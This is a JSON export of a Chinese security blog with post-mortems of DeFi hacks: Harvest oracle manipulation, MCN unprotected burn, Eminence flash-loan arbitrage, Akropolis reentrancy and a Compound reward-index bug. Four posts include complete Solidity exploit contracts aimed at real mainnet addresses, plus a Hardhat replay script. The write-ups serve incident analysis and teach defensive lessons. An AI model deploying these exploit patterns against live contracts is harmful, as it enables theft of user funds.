{"meta":{"title":"SCS","subtitle":"","description":"","author":"Janson Woods","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"Harvest价格预言机操纵攻击原理及复现","slug":"Harvest价格预言机操纵攻击原理及复现","date":"2021-11-19T02:42:40.000Z","updated":"2021-11-19T14:14:35.651Z","comments":true,"path":"2021/11/19/Harvest价格预言机操纵攻击原理及复现/","link":"","permalink":"http://example.com/2021/11/19/Harvest%E4%BB%B7%E6%A0%BC%E9%A2%84%E8%A8%80%E6%9C%BA%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"攻击者交易哈希： 0x9d093325272701d63fdafb0af2d89c7e23eaf18be1a51c580d9bce89987a2dc1 攻击流程简述：1.攻击者通过闪电贷获得5000万USDT和1700万的USDC； 2.将Curve.fi: y Swap池子中1142万的USDC进行swap得到1140万的USDT； 3.此时攻击者立刻将6千万的USDT存入Harvest的资金池中，并获得7100万fusdt作为存款凭证； 4.攻击者在Curve.fi: y Swap池子中将剩下的1143万的USDT进行swap换回1144万的USDC； 5.攻击者将手中的7100万fusdt进行赎回，获得约6100万的USDT，获利5百万； 6.攻击者重复图中步骤1-4多次，共计获利2500万美元。 攻击原理分析：攻击者通过闪电贷获得大量的初始资金，并使用大量的USDC/USDT对Curve.fi: y Swap进行流动性操纵，从而影响其价格，进行套利。将大量的USDC swap获得USDT，使得池子中USDT数量变少，将其价格拉高；此时将手中的6千万USDT存入Harvest平台中，此时Harvest的价格预言机的价格获取的USDT价格较高，因此铸造7100万的fusdt发给攻击者；攻击者此时将USDT 换回USDC，并将7100万的fusdt进行赎回，获得6100万的USDT，攻击者通过这一次操做，获利五百万美元，重复多次共获利2500万美元。 攻击复现：复现只是将一次攻击重复了6次，因此最后获利的金额与攻击者不同，但原理是一样的。 POC：（fork的块高为：11129473）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788pragma solidity ^0.7.0;import &quot;./Icurve-yswap.sol&quot;;import &quot;./IHarvestUsdcVault.sol&quot;;import &quot;./IUniswapV2Interfaces.sol&quot;;import &quot;./IUniswapV2Router02.sol&quot;;import &quot;./IYERC20.sol&quot;;import &quot;./IERC20USDT.sol&quot;;import &quot;hardhat/console.sol&quot;;contract Expolit&#123; IUniswapV2Pair usdcPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc); IUniswapV2Pair usdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852); IcurveYSwap yswap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51); // IUniswapV2Router02 router = IUniswapV2Router02(); IHarvestUsdcVault harvest = IHarvestUsdcVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE); IERC20USDT usdt = IERC20USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7); IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE); IERC20 yusdt = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D); IERC20 yusdc = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e); uint usdcLoan = 50000000*10**6; uint usdtLoan = 17300000*10**6; uint usdcRepayment = (usdcLoan * 100301) / 100000; uint usdtRepayment = (usdtLoan * 100301) / 100000; constructor() public &#123; usdc.approve(address(usdcPair),uint(-1)); usdc.approve(address(harvest),uint(-1)); usdc.approve(address(yswap),uint(-1)); usdt.approve(address(usdtPair),uint(-1)); usdt.approve(address(yswap),uint(-1)); &#125; function start() public &#123; console.log(&quot;----------Start---------&quot;); uint initusdtBalance = usdt.balanceOf(address(this)); uint initusdcBalance = usdc.balanceOf(address(this)); console.log(&quot;USDC init balance&quot;,initusdcBalance / 10**6); console.log(&quot;USDT init balance&quot;,initusdtBalance / 10**6); console.log(&quot;flashloan USDC&quot;); usdcPair.swap(usdcLoan,0,address(this),&quot;0x&quot;); usdc.approve(address(usdcPair),0); usdt.approve(address(usdtPair),0); uint lastusdcBalance = usdc.balanceOf(address(this)); uint lastusdtBalance = usdt.balanceOf(address(this)); console.log(&quot;----------Profit---------&quot;); console.log(&quot;USDC balance&quot;,lastusdcBalance / 10**6); console.log(&quot;USDT balance&quot;,lastusdtBalance / 10**6); &#125; function uniswapV2Call(address,uint,uint,bytes calldata) external &#123; if (msg.sender == address(usdcPair)) &#123; console.log(&quot;flashloan USDT&quot;); usdtPair.swap(0,usdtLoan,address(this),&quot;0x&quot;); usdc.transfer(address(usdcPair),usdcRepayment); console.log(&quot;repay USDC&quot;); &#125; if (msg.sender == address(usdtPair)) &#123; for (uint i = 0;i &lt; 6; i++)&#123; attackSwap(); &#125; usdt.transfer(address(usdtPair),usdtRepayment); console.log(&quot;repay USDT&quot;); &#125; &#125; function attackSwap() internal &#123; yswap.exchange_underlying(2,1,17200000*10**6,17000000*10**6); harvest.deposit(49000000000000); yswap.exchange_underlying(1,2,17310000*10**6,17000000*10**6); harvest.withdraw(fusdc.balanceOf(address(this))); console.log(&quot;attack swap&quot;); &#125; receive() external payable&#123; &#125;&#125; 复现结果：","categories":[],"tags":[{"name":"复盘分析、闪电贷、价格预言机","slug":"复盘分析、闪电贷、价格预言机","permalink":"http://example.com/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7%E3%80%81%E4%BB%B7%E6%A0%BC%E9%A2%84%E8%A8%80%E6%9C%BA/"}]},{"title":"MCN套利分析","slug":"MCN套利分析","date":"2021-11-04T02:42:40.000Z","updated":"2021-11-04T12:03:13.078Z","comments":true,"path":"2021/11/04/MCN套利分析/","link":"","permalink":"http://example.com/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/","excerpt":"","text":"1.攻击者使用0.01Weth从**Uniswap V2: MCN-WETH **中swap出7022 MCN； 2.攻击者调用MCN的burn函数，将Uniswap V2: MCN-WETH的MCN余额销毁，使得Uniswap V2: MCN-WETH的MCN数量变为10； 3.攻击者从Uniswap V2: MCN-WETH池中，将7022个MCN swap 出38.4个WETH。 原因分析： MCN的burn(address _who, uint _value)函数逻辑中，可以将任何使用者的代币销毁掉，并没有进行身份和权限的认定。攻击将事先swap出7022个MCN，后利用MCN合约设计缺陷，使得Uniswap V2: MCN-WETH池中MCN的代币数量消耗到一个很小的值，使得MCN相对于WETH的价格非常高，攻击者后使用7022MCN将Uniswap V2: MCN-WETH池中的WETH全部掏空。 POC：攻击合约： 12345678910111213141516171819202122232425262728293031323334pragma solidity ^0.6.0;// https://etherscan.io/tx/0xd091afe6b37256ebb3dd703a9646b27aaf7ce7fe8832778886ba0216361f7f00import &quot;./Mcn.sol&quot;;import &quot;./MEpair.sol&quot;;import &quot;./Weth.sol&quot;;import &quot;hardhat/console.sol&quot;;contract test&#123; Mcn mcn = Mcn(0xc047C42554c6495c85108aE8ee66fA4E3B88176d); MEpair pair = MEpair(0x6c239518495F92363Ad341B2290984EDA7623d1e); Weth weth = Weth(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); address owner = 0x0B61982356cF13D4CAAACa906f0fD8CB1e3d1e76; uint eamount = 0.01 ether; uint mamount = 7022000000000000000000; uint burn = 27126220522013288881625851; uint ethamount = 38465407605677952801; function start() public &#123; weth.deposit&#123;value:2000000000000000000&#125;(); weth.transfer(address(pair),eamount); pair.swap(0,mamount,address(this),&quot;&quot;); mcn.burn(address(pair),burn); pair.sync(); mcn.transfer(address(pair),mamount); pair.swap(ethamount,0,owner,&quot;&quot;); uint balance = weth.balanceOf(address(owner)); console.log(&quot;profit: &quot;,balance / 1 ether); &#125; fallback() external payable &#123; &#125;&#125; 部署脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344// We require the Hardhat Runtime Environment explicitly here. This is optional// but useful for running the script in a standalone fashion through `node &lt;script&gt;`.//// When running the script with `npx hardhat run &lt;script&gt;` you&#x27;ll find the Hardhat// Runtime Environment&#x27;s members available in the global scope.const &#123; ethers, network &#125; = require(&quot;hardhat&quot;);const hre = require(&quot;hardhat&quot;);async function main() &#123; const sender = &quot;0x56178a0d5F301bAf6CF3e1Cd53d9863437345Bf9&quot;; const Weth = &quot;0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2&quot;; [add1] = await ethers.getSigners(); await hre.network.provider.request(&#123; method: &quot;hardhat_impersonateAccount&quot;, params: [sender], &#125;); const signer = await ethers.provider.getSigner(sender); const Test = await ethers.getContractFactory(&quot;test&quot;); const test = await Test.deploy(); await test.deployed(); // 用模拟的账户给指定账户转账 await signer.sendTransaction(&#123; to: test.address, value: ethers.utils.parseEther(&quot;3.0&quot;), &#125;); console.log(&#x27;向合约地址转账3ETH&#x27;) await test.start(); // 取消模拟 await hre.network.provider.request(&#123; method: &quot;hardhat_stopImpersonatingAccount&quot;, params: [sender], &#125;);&#125;main().catch((error) =&gt; &#123; console.error(error); process.exitCode = 1;&#125;);// npx hardhat run test/test.js 总结：这是一次很典型的利用合约漏洞进行套利的攻击，因此在对合约进行设计时务必要注意到用户权限的界定和身份的检查！","categories":[],"tags":[{"name":"复盘分析、套利","slug":"复盘分析、套利","permalink":"http://example.com/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E5%A5%97%E5%88%A9/"}]},{"title":"Eminence (EMN)闪电贷套利攻击","slug":"Eminence(EMN)闪电贷攻击影响价格套利","date":"2021-10-22T02:42:40.000Z","updated":"2021-10-22T13:12:11.902Z","comments":true,"path":"2021/10/22/Eminence(EMN)闪电贷攻击影响价格套利/","link":"","permalink":"http://example.com/2021/10/22/Eminence(EMN)%E9%97%AA%E7%94%B5%E8%B4%B7%E6%94%BB%E5%87%BB%E5%BD%B1%E5%93%8D%E4%BB%B7%E6%A0%BC%E5%A5%97%E5%88%A9/","excerpt":"","text":"2020年9 月 29 日， Yearn.finance 的新项目 Eminence.finance 遭受闪电贷攻击。有三笔共计价值约 1.09 亿人民币的资金，被从 Eminence 智能合约中转出 Eminence (EMN) Eminence AAVE (eAAVE) Uniswap DAI/ETH LP (UNI-V2) {“0x3882a1e71636C4D5896af656793Cb358E6E9713F”:”attacker’s contract”, “0x5ade7aE8660293F2ebfcEfaba91d141d72d221e8”:”EMN”,“0xc08f38f43ADB64d16Fe9f9eFCC2949d9eddEc198”:”eAAVE”} 交易哈希：0x3503253131644dd9f52802d071de74e456570374d586ddd640159cf6fb9b8ad8资金流动图： 在该笔交易中，1.攻击者首先通过 Uniswap 中的闪电贷（Flash Loan）借得 1500 万个 DAI, 然后全部购买 EMN 代币，共购得约 1,383,650,487 个 EMN 代币； 2.其中一半 EMN，共约 691,825,243 个 EMN 代币 , 购买 eAAVE 代币，共获得约 572,431 个 eAAVE 代币； 3.攻击者将另一半 691,825,243 个 EMN购买得到10024.579个DAI；（价格不对等的） 4.攻击者将572,431 个 eAAVE卖出，得到691,825,243 个 EMN 代币； 5.将691,825,243 个 EMN 代币卖出，得到6649.057个DAI； 通过以上操作攻击者共有16,673.636的DAI，攻击者重复以上步骤3次，共获利5919.922个DAI。 漏洞原理：攻击者在第2步时，使用EMN购买eAAVE调用eAAVE的buy（）函数： 123456789101112131415//eAAVEfunction buy(uint _amount, uint _min) external returns (uint _bought) &#123; _bought = _buy(_amount); require(_bought &gt;= _min, &quot;slippage&quot;); EMN.claim(msg.sender, _amount); _mint(msg.sender, _bought); emit CashShopBuy(msg.sender, _bought, _amount);&#125;function sell(uint _amount, uint _min) external returns (uint _bought) &#123; _bought = _sell(_amount); require(_bought &gt;= _min, &quot;slippage&quot;); _burn(msg.sender, _amount); EMN.award(msg.sender, _bought); emit CashShopSell(msg.sender, _amount, _bought);&#125; 123456789//EMN function award(address _to, uint _amount) external &#123; require(gamemasters[msg.sender], &quot;!gm&quot;); _mint(_to, _amount);&#125;function claim(address _from, uint _amount) external &#123; require(gamemasters[msg.sender]||npcs[msg.sender], &quot;!gm&quot;); _burn(_from, _amount);&#125; 在调用eAAVE的buy（）函数时，会调用EMN的claim（）函数，在EMN合约的claim函数处理逻辑中会将_amount数量的EMN销毁掉；由于EMN减少，池中相对于DAI的兑换率会升高，此时攻击者将另一半的EMN卖出，得到多出正常值的DAI，实现获利。 因此该漏洞主要是合约逻辑漏洞的缺陷，在DAI-EMN-eAAVE这三种代币之间不能正确维持三者之间的稳定关系，使得攻击者有利可图。POC：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647pragma solidity ^0.6.6;import &quot;./IDAI.sol&quot;;import &quot;./IeAAVE.sol&quot;;import &quot;./IEMN.sol&quot;;import &quot;./IUNSwapPair.sol&quot;;import &quot;hardhat/console.sol&quot;;contract test &#123; IEMN emn = IEMN(0x5ade7aE8660293F2ebfcEfaba91d141d72d221e8); IeAAVE eAAVE = IeAAVE(0xc08f38f43ADB64d16Fe9f9eFCC2949d9eddEc198); IUNSwapPair pair = IUNSwapPair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11); IDAI dai = IDAI(0x6B175474E89094C44Da98b954EedeAC495271d0F); uint borrowed = 15000000000000000000000000; function execute() public &#123; pair.swap(borrowed, 0, address(this), &quot;0x&quot;); &#125; function uniswapV2Call(address,uint,uint,bytes calldata) external &#123; uint hdai = dai.balanceOf(address(this)); console.log(&quot;DAI hacker: &quot;,hdai); dai.approve(address(emn), uint(-1)); emn.buy(borrowed, 0); emn.approve(address(eAAVE), uint(-1)); uint balance = emn.balanceOf(address(this)); uint half = balance / 2; eAAVE.buy(half, 0); uint ebalance = eAAVE.balanceOf(address(this)); emn.sell(half, 0); eAAVE.sell(ebalance,0); balance = emn.balanceOf(address(this)); emn.sell(balance, 0); uint toreturn = (borrowed * 1000) / 997 +1; dai.transfer(address(pair), toreturn); hdai = dai.balanceOf(address(this)); console.log(&quot;profit: &quot;,hdai / 1 ether); &#125;&#125; 本次复现仅实现其中一次攻击，实际攻击将此攻击循环多次。","categories":[],"tags":[{"name":"复盘分析、闪电贷、套利","slug":"复盘分析、闪电贷、套利","permalink":"http://example.com/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7%E3%80%81%E5%A5%97%E5%88%A9/"}]},{"title":"Akropolis攻击事件-重入攻击","slug":"Akropolis攻击事件-重入攻击","date":"2021-10-19T02:42:40.000Z","updated":"2021-10-19T10:05:01.859Z","comments":true,"path":"2021/10/19/Akropolis攻击事件-重入攻击/","link":"","permalink":"http://example.com/2021/10/19/Akropolis%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/","excerpt":"","text":"Akropolis的交易模式Akropolis就是众多资产托管平台中的一个：普通用户将个人的数字资产投入到Akropolis中，由Akropolis确定投资方向，优化投资策略。Akropolis获得投资收益之后，将收益按比例分配给投资Akropolis的普通用户。以现实中的金融活动举例子，Akropolis就像是基金，其所投资的DeFi项目就是股票，基民购买基金，基金持有股票，获得收益后将收益分配给基民。 用户通过savingsModule.deposit函数将手中的token投资到Protocol中，获得Protocol的份额（份额代币LP），等到将来Protocol中的资产升值了，那么用户便可以从Protocol获取到一定的收益。 savingsModule.deposit函数源码（https://github.com/akropolisio/delphi/blob/release-1.0/contracts/modules/savings/SavingsModule.sol#L217-L277） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/** * @notice Deposit tokens to a protocol * @param _protocol Protocol to deposit tokens * @param _tokens Array of tokens to deposit * @param _dnAmounts Array of amounts (denormalized to token decimals) */function deposit(address _protocol, address[] memory _tokens, uint256[] memory _dnAmounts)public operationAllowed(IAccessModule.Operation.Deposit)returns(uint256) &#123; //distributeRewardIfRequired(_protocol); uint256 nAmount; for (uint256 i=0; i &lt; _tokens.length; i++) &#123; nAmount = nAmount.add(normalizeTokenAmount(_tokens[i], _dnAmounts[i])); &#125; uint256 nBalanceBefore = distributeYieldInternal(_protocol); //获取deposit之前Protocol的余额，before-deposit depositToProtocol(_protocol, _tokens, _dnAmounts); //将对应token存入Protocol的池子，调用_tokens的transferFrom函数转账 uint256 nBalanceAfter = updateProtocolBalance(_protocol); //获取deposit之后Protocol的余额，after-deposit PoolToken poolToken = PoolToken(protocols[_protocol].poolToken); uint256 nDeposit = nBalanceAfter.sub(nBalanceBefore); uint256 cap; if(userCapEnabled) &#123; cap = userCap(_protocol, _msgSender()); &#125; uint256 fee; if(nAmount &gt; nDeposit) &#123; fee = nAmount - nDeposit; poolToken.mint(_msgSender(), nDeposit); &#125; else &#123; fee = 0; poolToken.mint(_msgSender(), nAmount); uint256 yield = nDeposit - nAmount; if (yield &gt; 0) &#123; //Additional Yield received from protocol (because of lottery, or something) createYieldDistribution(poolToken, yield); &#125; &#125; if(protocolCapEnabled) &#123; if( !(vipUserEnabled &amp;&amp; protocols[_protocol].isVipUser[_msgSender()]) ) &#123; uint256 ptTS = poolToken.totalSupply(); require(ptTS &lt;= protocolCap[_protocol], &quot;SavingsModule: deposit exeeds protocols cap&quot;); &#125; &#125; if(userCapEnabled) &#123; //uint256 actualAmount = nAmount.sub(fee); //Had to remove this because of stack too deep err require(cap &gt;= nAmount.sub(fee), &quot;SavingsModule: deposit exeeds user cap&quot;); // cap = cap - nAmount.sub(fee); //protocols[_protocol].userCap[_msgSender()] = cap; // emit UserCapChanged(_protocol, _msgSender(), cap); &#125; emit Deposit(_protocol, _msgSender(), nAmount, fee); return nDeposit;&#125; 12345678910function depositToProtocol(address _protocol, address[] memory _tokens, uint256[] memory _dnAmounts) internal &#123; require(_tokens.length == _dnAmounts.length, &quot;SavingsModule: count of tokens does not match count of amounts&quot;); for (uint256 i=0; i &lt; _tokens.length; i++) &#123; address tkn = _tokens[i]; IERC20(tkn).safeTransferFrom(_msgSender(), _protocol, _dnAmounts[i]);//调用tkn的safeTransferFrom函数 IDefiProtocol(_protocol).handleDeposit(tkn, _dnAmounts[i]); emit DepositToken(_protocol, tkn, _dnAmounts[i]); &#125;&#125; 1234567891011121314151617181920//fakecoin的transferFrom 函数会重入deposit函数function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) &#123; console.log(&quot;transferFrom&quot;); emit ReEntered(dyPoolBalance); address[] memory tokensIn = new address[](1); tokensIn[0] = address(dai); uint[] memory amountsIn = new uint[](1); amountsIn[0] = deposit; nDepositDai = savingsModule.deposit(curveYPool, tokensIn, amountsIn); console.log(&quot;nDepositDai :&quot;, nDepositDai); dyPoolBalance = dyPool.balanceOf(address(this)); console.log(&quot;dyPoolBalance DAI: &quot;, dyPoolBalance); emit DyPoolBalance(1, dyPoolBalance); return dai.transferFrom(address(this), curveYPool, 1*10**18); //return true; &#125; 本次攻击的漏洞原因为：deposit并未对存入的代币进行校验，使得可以将任何代币打入protocol中，同时并没有进行防重入的检查，导致出现的二次重入攻击。攻击简述：0xe1f375a47172b5612d96496a4599247049f07c9a7d518929fbe296b0c281e04d 1.攻击者将将自己的空气币fakecoin通过deposit存入，首先进行余额检查获得before-deposit1；（假定为０） 2.合约执行depositToProtocol(_protocol, _tokens, _dnAmounts)语句，fakecoin的TransferFrom函数； ​ 2.1 fakecoin的TransferFrom函数将5000000个fakecoin打入Protocol中，并再一次进行deposit函数，获得第二次deposit的before-deposit2；*（０）fakecoin并不属于交易池中的代币，没有价值，所以依然是０. ​ 2.2 在第二次的deposit中，调用DAI的TransferFrom将闪电贷来的2474个DAI存入protocol中； ​ 2.3 后面对第二次的deposit的余额检查获得after-deposit2；（2474个DAI） ​ 2.4 根据公式 after-before 获得本次存入DAI的数量L1（2474），并向攻击者铸造L1数量的LP token； 3，第二次deposit执行结束后回到第一次的deposit的执行环境中，相当于执行完第一次的TransferFrom函数，继续执行 1uint256 nBalanceAfter = updateProtocolBalance(_protocol); 获得第一次deposit的after-deposit1（2474个DAI，同时也是第二次ｄｅｐｏｓｉｔ的after-deposit2）； ４.根据公式 after-deposit1 - before-deposit1（2474-0）得到第一次deposit获得的LP token数量L2（2474）。 ５.攻击者使用withdraw提取操作将4900左右个LP换成DAI，并将其转走。 攻击者通过这其中的一次操作利用闪电贷来的2474个DAI作为投入，获得４９００个DAI。重复多次，共攫取2,000,000美元的数字货币资产！POC：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153//SPDX-License-Identifier: Unlicensepragma solidity ^0.7.0;import &quot;hardhat/console.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;import &quot;./ISavingsModule.sol&quot;;import &quot;./IUniswapV2Pair.sol&quot;;import &quot;./ICurveFiProtocol_Y.sol&quot;;contract Exploit2 is ERC20 &#123;// break down the tx from: https://oko.palkeo.com/0xe2307837524Db8961C4541f943598654240bd62f/calls_from/// 1. calls savingsModule.poolTokenByProtocol // 2. calls balanceOf on dyPoolToken (why, maybe this is a loop?)// 3. approves spending of contract&#x27;s DAI by savingsModule// 4. checks balance of DAI// 5. calls savingsModule.deposit sending 5000000 of address(this)// 6. re-entered into address(this).transferFrom, calls savingsModule.deposit sending 24747400163735396272620 dai// 7. now they transfer 1 dai, 1*10**18, to curveYPool// 8. call savingsModule.normalizedBalance// 9. calls balanceOf on dyPoolToken// 10. calls savingsModule.withdraw for// - dnAmount: 49268.189080 × 10¹⁸ // - _protocol: curveYPool// - token: DAI// - maxNAmount: 0// 11. goto line 5 for one more loop.// 12. approve 0. // Pair of akro contracts/tokens: address curveYPool = 0x7967adA2A32A633d5C055e2e075A83023B632B4e; address dyPoolToken = 0x2AFA3c8Bf33E65d5036cD0f1c3599716894B3077; // AKRO contract ISavingsModule savingsModule = ISavingsModule(0x73fC3038B4cD8FfD07482b92a52Ea806505e5748); // DAI/WETH pair for flashloan IUniswapV2Pair pair = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11); ERC20 dai = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); ERC20 dyPool = ERC20(0x2AFA3c8Bf33E65d5036cD0f1c3599716894B3077); ICurveFiProtocol_Y AkroYPool = ICurveFiProtocol_Y(curveYPool); uint borrow = 25000*10**18; uint deposit = 24000*10**18; // akro had a deposit cap per user I think it was 25,000. uint repay = (borrow * 100301) / 100000; uint dyPoolBalance; uint daiBalance; uint thisSupply = 500000; uint nDepositFake; uint nDepositDai; uint nBalance; uint loops; event DyPoolBalance(uint indexed state, uint indexed dyBalance); event ReEntered(uint indexed dyPoolBalance); // state 0: start, should be 0 // state 1: first, should be &lt; 25000000000000000000000 // state 2: second, should be &gt; 45000000000000000000000 // state 3: last, should be less than 24000000000000000000000 constructor() payable ERC20(&quot;Exploit&quot;, &quot;XPLT&quot;) &#123; // doing all the approvals here: // approve the akro contract to transfer our DAI dai.approve(address(savingsModule), uint(-1)); // need to approve the akro contract to transfer our akro pool tokens dyPool.approve(address(savingsModule), uint(-1)); balanceCheck(&quot;Deploy&quot;); address poolToken = savingsModule.poolTokenByProtocol(curveYPool); console.log(&quot;poolToken: &quot;, poolToken); &#125; // call this to start the exploit function run(uint _loops) external &#123; loops = _loops; console.log(&quot;RUN&quot;); // take out a dai loan: pair.swap(borrow, 0, address(this), &quot;0x&quot;); // ^^ will call uniswapV2Call &#125; function uniswapV2Call(address,uint,uint,bytes calldata) external &#123; balanceCheck(&quot;SWAP&quot;); dyPoolBalance = dyPool.balanceOf(address(this)); console.log(&quot;dyPoolBalance: &quot;, dyPoolBalance); emit DyPoolBalance(0, dyPoolBalance); // prep savingsModule deposit uint[] memory amountsIn = new uint[](1); amountsIn[0] = thisSupply; address[] memory tokensIn = new address[](1); tokensIn[0] = address(this); nDepositFake = savingsModule.deposit(curveYPool, tokensIn, amountsIn); console.log(&quot;nDepositFake: &quot;, nDepositFake); console.log(&quot;dyPoolBalance: &quot;, dyPoolBalance); console.log(&quot;back to uniswapV2Call&quot;); // below this we have returned from the malicious transfer from. nBalance = AkroYPool.normalizedBalance(); dyPoolBalance = dyPool.balanceOf(address(this)); console.log(&quot;dyPoolBalance: &quot;, dyPoolBalance); emit DyPoolBalance(2, dyPoolBalance); savingsModule.withdraw(curveYPool, address(dai), dyPoolBalance*99/100, 0); console.log(&quot;withdraw: &quot;,dyPoolBalance*99/100); balanceCheck(&quot;BACK FROM HACK&quot;); dyPoolBalance = dyPool.balanceOf(address(this)); console.log(&quot;dyPoolBalance left over: &quot;, dyPoolBalance); emit DyPoolBalance(3, dyPoolBalance); for(uint i = 0;i &lt; loops; i++)&#123; savingsModule.deposit(curveYPool, tokensIn, amountsIn); dyPoolBalance = dyPool.balanceOf(address(this)); savingsModule.withdraw(curveYPool, address(dai), dyPoolBalance*99/100, 0); console.log(&quot;withdraw: &quot;,dyPoolBalance*99/100); &#125; bool daiSuccess = dai.transfer(address(pair), repay); balanceCheck(&quot;PROFIT&quot;); &#125; // transferFrom, a.k.a. &quot;Eye am the Captain now&quot;. // this will be the malicious implementation *one million dollars* function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) &#123; console.log(&quot;transferFrom&quot;); emit ReEntered(dyPoolBalance); address[] memory tokensIn = new address[](1); tokensIn[0] = address(dai); uint[] memory amountsIn = new uint[](1); amountsIn[0] = deposit; nDepositDai = savingsModule.deposit(curveYPool, tokensIn, amountsIn); console.log(&quot;nDepositDai :&quot;, nDepositDai); dyPoolBalance = dyPool.balanceOf(address(this)); console.log(&quot;dyPoolBalance DAI: &quot;, dyPoolBalance); emit DyPoolBalance(1, dyPoolBalance); return dai.transferFrom(address(this), curveYPool, 1*10**18); //return true; &#125; receive() external payable &#123;&#125; function balanceCheck(string memory title) internal &#123; console.log(&quot;------------------------&quot;); console.log(title); daiBalance = dai.balanceOf(address(this)); console.log(&quot;DAI: &quot;, daiBalance / 10**18); &#125;&#125; ＰＯＣ中在一笔交易中重入３次，共获利71259个DAI。 总结： 在对交易池进行存、取的操作时，类似于发币转账的过程，一定要注意到防重入的思想，同时当交易池中包含多种代币时，一定要对存入的代币进行校验，以免数据交接不对等出现各种问题。","categories":[],"tags":[{"name":"复盘分析、闪电贷、重入、","slug":"复盘分析、闪电贷、重入、","permalink":"http://example.com/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7%E3%80%81%E9%87%8D%E5%85%A5%E3%80%81/"}]},{"title":"Compound第62提案升级导致奖励分发过多","slug":"compound代币分发过多漏洞1012","date":"2021-10-15T09:13:40.000Z","updated":"2021-10-13T09:15:41.113Z","comments":true,"path":"2021/10/15/compound代币分发过多漏洞1012/","link":"","permalink":"http://example.com/2021/10/15/compound%E4%BB%A3%E5%B8%81%E5%88%86%E5%8F%91%E8%BF%87%E5%A4%9A%E6%BC%8F%E6%B4%9E1012/","excerpt":"","text":"compound第62提案升级导致奖励分发过多 Compound创始人表示：该漏洞是由于Compound的62次提案升级所导致。 Comptroller#compSpeeds storage variable is no longer being used and has been effectively deleted. It’s replaced by Comptroller#compBorrowSpeeds and Comptroller#compSupplySpeeds. This proposal copies the current rates into the new storage variables. Comptroller#_setCompSpeed(CToken,uint256) function has been removed and replaced by Comptroller#_setCompSpeeds(CToken[],uint256[],uint256[]). This new function allows COMP rewards rates for multiple markets to be set with a single call. An upgrade hook initializes all non-initialized market state indices (initial index is 1e36). When new markets are added, their state indices are now properly initialized (used to use lazy initialization which caused many problems). 升级主要做了以下改变：1.使用 Comptroller#compBorrowSpeeds 和Comptroller#compSupplySpeeds来代替Comptroller#compSpeedsstorage类型变量； 2.Comptroller#_setCompSpeeds(CToken[],uint256[],uint256[])来对Comptroller#_setCompSpeed(CToken,uint256) 进行升级； 3.设定所有新增的初始化的市场状态指数（initial index is 1e36）； 原本设定所有未初始化的市场状态指数是为了解决惰性初始化导致的许多其他问题，来解决之前存在的整数溢出漏洞 （链接1），但是并没有全面考虑到如此的升级对原本的功能的影响！ 该漏洞产生的条件：需要在62次提案更新之前与某些特定代币（cSAI、cTUSD、cMKR、cSUSHI、cAAVE、cYFI）进行存款或借款，并留有一定的余额，就可以获得大量的comp收益奖励。我们已其中一个交易为例进行分析：https://etherscan.io/tx/0xee318650ae8bcf83517e77e8654d40201990080fcb888087f737aea28e70bdb1 获利者地址为（0xab5a193a11f779fe105e8edf9815a0b514b013ca），通过claimCmop函数来提取收益，但是却获得了22,995.930896459946832819 枚comp的收益，这个数字远远大于应获得的收益。 通过交易追踪发现，该获利者在领取借贷代币（cUSDT）的奖励时，获得了大量的comp代币（ 22,995.425435193061317525枚）。 用户借贷comp奖励的公式为：borrowerAmount * deltaIndex（即：借款数量*奖励因子）。 deltaIndex = borrowIndex - borrowerIndex（奖励因子 = 池借贷指数 - 用户借贷指数），由于第62次提案的升级，cUSDT池借贷指数被初始化为 compInitialIndex （1e36），而此时用户的借贷指数为0，导致算出的奖励因子deltaIndex非常大为1e36。合约正常逻辑应该先通过if (borrowerIndex == 0 &amp;&amp; borrowIndex &gt; = compInitialIndex) 该分支的判断，使用户的借贷指数进行更新为compInitialIndex（1e36），才可以进行奖励的计算！此处由于 borrowIndex &gt; compInitialIndex（缺少等号） 导致绕过该判断，直接进行奖励计算，导致奖励因子计算出的值非常的大。 该用户在62次更新之前的一笔cUSDT的借款，为其带来了22,995枚comp的”收益“。 